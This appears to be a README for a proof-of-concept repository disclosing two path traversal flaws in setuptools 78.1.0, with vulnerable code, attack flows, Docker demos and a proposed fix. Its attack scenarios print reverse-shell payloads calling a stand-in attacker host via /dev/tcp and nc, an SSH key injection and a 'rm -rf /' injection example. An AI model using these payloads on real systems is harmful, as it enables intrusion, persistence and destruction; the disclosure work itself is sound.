# Setuptools Path Traversal Vulnerabilities

This repository documents **two distinct path traversal vulnerabilities** in setuptools 78.1.0:

| Vulnerability | Component | Attack Vector | Impact |
|--------------|-----------|---------------|--------|
| [URL Path Injection](#vulnerability-1-url-path-injection) | `package_index.py` | Malicious package index | Arbitrary file write with attacker content |
| [Namespace Package Traversal](#vulnerability-2-namespace-package-traversal) | `wheel.py` | Malicious wheel file | Directory + file creation outside install dir |

---

## Vulnerability 2: Namespace Package Traversal

**NEW: Arbitrary file write via malicious `namespace_packages.txt` in wheel files**

| Field | Value |
|-------|-------|
| **Component** | `setuptools/wheel.py:224-236` |
| **Function** | `Wheel._fix_namespace_packages()` |
| **Type** | Path Traversal (CWE-22) |
| **Impact** | Arbitrary directory/file creation |

### Quick Demo

```bash
cd namespace_packages_vuln/
rm -rf /tmp/pwned_by_namespace_traversal
python3 exploit_test.py
ls -la /tmp/pwned_by_namespace_traversal/
```

### The Bug

```python
def _fix_namespace_packages(egg_info, destination_eggdir):
    namespace_packages = _read_utf8_with_fallback(...).split()
    for mod in namespace_packages:
        # mod = "/tmp/pwned" from malicious wheel
        mod_dir = os.path.join(destination_eggdir, *mod.split('.'))
        # Result: /tmp/pwned (absolute path escapes destination!)
        os.mkdir(mod_dir)  # Creates /tmp/pwned/
        with open(os.path.join(mod_dir, '__init__.py'), 'w') as fp:
            fp.write(NAMESPACE_PACKAGE_INIT)  # Writes file outside install dir
```

### Attack Flow

```
namespace_packages.txt contains: /tmp/pwned
                                     │
                                     ▼
mod.split('.') = ['/tmp/pwned']
                                     │
                                     ▼
os.path.join(dest, '/tmp/pwned') = '/tmp/pwned'  ← absolute path wins!
                                     │
                                     ▼
os.mkdir('/tmp/pwned')  ← directory created outside dest
open('/tmp/pwned/__init__.py', 'w')  ← file written outside dest
```

See [namespace_packages_vuln/RESEARCH.md](namespace_packages_vuln/RESEARCH.md) for full technical analysis.

---

## Vulnerability 1: URL Path Injection

**Arbitrary file write via absolute path injection in `package_index.py`**

## Quick Start

```bash
# Full demo with attacker server + victim client (recommended)
docker compose up --build

# Or standalone single container
docker build -t setuptools-cve-poc .
docker run --rm setuptools-cve-poc
```

## Demo Output

```
============================================================
EXECUTING ATTACK: CRON
============================================================

[VICTIM] Connecting to package index: http://server:8080/simple/
[VICTIM] egg_info_for_url() extracted: /tmp/demo/etc/cron.d/backdoor
[VICTIM] os.path.join(tmpdir, name) = /tmp/demo/etc/cron.d/backdoor
[VICTIM] ^^^ NOTE: tmpdir is IGNORED because name is absolute!

[EXPLOITED] File written to: /tmp/demo/etc/cron.d/backdoor

[FILE CONTENTS]
----------------------------------------
# Malicious cron job - reverse shell every minute
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
----------------------------------------

============================================================
ATTACK SUMMARY
============================================================
  [EXPLOITED] cron
  [EXPLOITED] ssh
  [EXPLOITED] bashrc
```

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Docker Network                                │
│                                                                      │
│  ┌──────────────────────┐         ┌──────────────────────┐          │
│  │   ATTACKER SERVER    │         │    VICTIM CLIENT     │          │
│  │   (malicious-pypi)   │         │   (victim-client)    │          │
│  │                      │         │                      │          │
│  │  Serves malicious    │ ──────► │  setuptools 78.1.0   │          │
│  │  package index with  │         │  fetches packages    │          │
│  │  encoded absolute    │ ◄────── │  from attacker       │          │
│  │  paths in URLs       │         │                      │          │
│  │                      │         │  Files written to:   │          │
│  │  Port 8080           │         │  /etc/cron.d/        │          │
│  └──────────────────────┘         │  ~/.ssh/             │          │
│                                   │  ~/.bashrc           │          │
│                                   └──────────────────────┘          │
└─────────────────────────────────────────────────────────────────────┘
```

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Component** | `setuptools/package_index.py:810-825` |
| **Function** | `PackageIndex._download_url()` |
| **Type** | Path Traversal (CWE-22) |
| **Impact** | Arbitrary File Write |
| **Tested Version** | setuptools 78.1.0 |

## The Bug

```python
def _download_url(self, url, tmpdir):
    name, _fragment = egg_info_for_url(url)  # Returns "/etc/passwd" from %2Fetc%2Fpasswd
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')  # Only sanitizes ".."

    filename = os.path.join(tmpdir, name)  # os.path.join ignores tmpdir when name is absolute!
    return self._download_vcs(url, filename) or self._download_other(url, filename)
```

**Root Cause:** `os.path.join("/tmp/safe", "/etc/passwd")` returns `"/etc/passwd"` - the first argument is ignored when the second is absolute.

## Attack Scenarios

### Scenario 1: Cron Job Installation
```
Target:  /etc/cron.d/backdoor
Payload: * * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
Impact:  Reverse shell every minute
```

### Scenario 2: SSH Key Injection
```
Target:  ~/.ssh/authorized_keys
Payload: ssh-rsa AAAAB3... attacker@evil.com
Impact:  Persistent SSH access without password
```

### Scenario 3: Shell Profile Backdoor
```
Target:  ~/.bashrc
Payload: curl http://attacker/beacon; nc -e /bin/bash attacker 4444 &
Impact:  Code execution on every new shell
```

## Files

```
├── docker-compose.yml          # Two-container attack demo
├── server/
│   ├── Dockerfile              # Attacker's malicious PyPI server
│   └── malicious_server.py     # Serves poisoned package links
├── client/
│   ├── Dockerfile              # Victim with vulnerable setuptools
│   └── victim_client.py        # Demonstrates exploitation
├── namespace_packages_vuln/    # NEW: wheel.py namespace traversal
│   ├── RESEARCH.md             # Technical deep dive
│   ├── build_malicious_wheel.py    # Creates malicious wheel
│   ├── exploit_test.py         # Triggers vulnerability
│   └── malicious-1.0-py3-none-any.whl  # Pre-built PoC wheel
├── Dockerfile                  # Standalone single-container demo
├── demo_scenarios.py           # All three scenarios in one script
├── poc_direct_download.py      # Simplest PoC
├── poc_path_traversal.py       # Basic PoC with server
├── poc_realistic_attack.py     # Simulated attack
├── poc_full_easy_install.py    # Full attack chain
├── test_path_traversal_security.py  # 45 security tests
├── RESEARCH.md                 # Deep technical analysis (package_index.py)
└── README.md
```

## Running the Demo

### Option 1: Docker Compose (Recommended)

```bash
# Start both containers
docker compose up --build

# View server logs only
docker compose logs server

# Run specific scenario
docker compose run client python -c "
from victim_client import run_attack
run_attack('server', 8080, 'ssh')
"
```

### Option 2: Standalone Container

```bash
docker build -t setuptools-cve-poc .
docker run --rm setuptools-cve-poc
```

### Option 3: Local Python

```bash
pip install setuptools==78.1.0
python poc_direct_download.py
python demo_scenarios.py
```

## Attack Flow

```
Malicious URL                         Extracted Filename         Final Path
─────────────────────────────────     ──────────────────         ──────────────────
http://evil/%2Fetc%2Fcron.d%2Fjob  →  /etc/cron.d/job         →  /etc/cron.d/job
             └─────────┬─────────┘
            URL-encoded absolute path
            decoded by egg_info_for_url()
```

## Affected Code Path

```
PackageIndex._download_url()     ← Vulnerable function
    │
    ├── egg_info_for_url()       ← Extracts & URL-decodes filename
    │
    ├── while '..' in name       ← Only sanitizes "..", not absolute paths
    │
    ├── os.path.join()           ← Ignores tmpdir for absolute paths
    │
    └── _download_other()
            │
            └── _download_to()   ← Writes file to attacker-controlled path
```

## Fix

```python
def _download_url(self, url, tmpdir):
    name, _fragment = egg_info_for_url(url)
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')

        # FIX: Strip absolute path prefixes
        if os.path.isabs(name):
            name = name.lstrip('/\\')

        # FIX: Handle Windows drive letters
        if len(name) > 1 and name[1] == ':':
            name = name[0] + '_' + name[2:]
    else:
        name = "__downloaded__"

    filename = os.path.join(tmpdir, name)

    # FIX: Validate path is under tmpdir
    if not os.path.realpath(filename).startswith(os.path.realpath(tmpdir) + os.sep):
        raise DistutilsError(f"Path escapes download directory: {filename}")

    return self._download_vcs(url, filename) or self._download_other(url, filename)
```

## Related Work

This is a **different vulnerability** from the March 2024 command injection report:

| | March 2024 Report | This Research |
|--|-------------------|---------------|
| **Type** | Command Injection | Path Traversal |
| **Vector** | Shell metacharacters in git:// URLs | URL-encoded absolute paths |
| **Payload** | `git://host; rm -rf /` | `http://host/%2Fetc%2Fpasswd` |
| **Root Cause** | Unsanitized shell execution | Missing absolute path check |

## References

- [RESEARCH.md](RESEARCH.md) - Full technical deep dive (package_index.py)
- [namespace_packages_vuln/RESEARCH.md](namespace_packages_vuln/RESEARCH.md) - Technical analysis (wheel.py)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Python os.path.join docs](https://docs.python.org/3/library/os.path.html#os.path.join)
- [setuptools GitHub](https://github.com/pypa/setuptools)

## Disclaimer

This research is for educational and authorized security testing purposes only.
